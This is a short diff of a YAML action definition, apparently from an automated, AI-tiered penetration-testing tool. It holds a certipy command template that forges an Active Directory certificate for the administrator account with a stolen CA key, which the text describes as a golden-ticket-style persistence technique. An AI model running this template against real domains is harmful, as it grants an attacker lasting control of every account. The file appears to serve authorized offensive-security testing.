@@ -7,13 +7,14 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: certipy forge -ca-pfx '{ca_pfx}' -upn 'administrator@{domain}' -subject
   'CN=Administrator'
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- adcs_findings
+- certificate_obtained
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: Forges certificate using stolen CA private key. Equivalent to golden ticket
-  — any user, indefinite validity.
+mechanism: "Forges certificate using stolen CA private key. Equivalent to golden ticket\
+  \ \u2014 any user, indefinite validity."
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.md
